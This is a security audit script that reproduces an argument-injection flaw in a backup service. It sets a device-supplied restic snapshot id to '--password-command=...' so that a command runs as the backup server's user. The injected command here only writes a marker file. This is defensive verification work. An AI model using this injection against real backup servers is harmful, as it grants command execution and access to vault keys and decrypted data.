// Audit 2, finding: a paired person runs any command on the backup server.
//
// `backupList` / `backupRead` (sessions.ts) hand the device's `ref` on; `BackupService.repository`
// only checks that `ref.notes.id` is a string, and `restore.ts` passes it to
// `spawn(restic, ['dump', snapshotId, path])` without `--`. A snapshot id beginning with `-` is a
// restic option, and restic resolves `--password-command` in its root command's pre-run - before
// `dump` counts its arguments. So `ref.notes.id = '--password-command=<anything>'` runs <anything>
// as the backup server's user, who reads every vault's grant (vault key, account key pair) and
// every decrypted copy on it.
//
// This calls the backup server's own `listBackup` with the pinned restic; the command it injects
// only writes a marker file into a scratch folder.
//
//   cd packages/backup
//   MYCEL_RESTIC="$HOME/tools/restic/restic_0.19.1_windows_amd64.exe" npx tsx scripts/audit2/restic-snapshot-id-injection.mts
import { existsSync, mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { Restic } from '../../src/restic.js'
import { listBackup } from '../../src/restore.js'

const binary = process.env.MYCEL_RESTIC
if (!binary) {
  console.log('MYCEL_RESTIC must name the restic binary')
  process.exit(2)
}
const scratch = mkdtempSync(join(tmpdir(), 'audit2-restic-inject-'))
const marker = join(scratch, 'ran-on-the-backup-server.txt')
// restic splits the option's value like a shell: backslashes escape, so the path goes with slashes.
const command = process.platform === 'win32' ? `cmd /c echo injected> ${marker.replace(/\\/g, '/')}` : `sh -c 'echo injected > ${marker}'`
let failed = false
try {
  const restic = new Restic(binary, join(scratch, 'cache'), 'audit2')
  // The vault's own destination, as a paired person's device names it (`ref.destination`).
  const destination = { id: 'local', repository: join(scratch, 'repo'), password: 'the vault repository password' }
  const ref = {
    destination: 'local',
    folder: 'ignored - the backup server sets it',
    notes: { id: `--password-command=${command}`, time: 0 },
    files: null
  }
  const outcome = await listBackup(restic, destination as never, ref as never).then(
    (entries) => `listed ${entries.length}`,
    (error: unknown) => `failed: ${error instanceof Error ? error.message : String(error)}`
  )
  console.log(`listBackup ${outcome}`)
  const ran = existsSync(marker)
  console.log(ran ? `the injected command ran: ${marker} says ${JSON.stringify(readFileSync(marker, 'utf8').trim())}` : 'the injected command did not run')
  console.log(`${ran ? 'FAIL' : 'PASS'}: EXPECTED SAFE: a snapshot id from a device is never a restic option (FAIL = finding reproduced)`)
  failed = ran
} finally {
  rmSync(scratch, { recursive: true, force: true })
}
process.exit(failed ? 1 : 0)
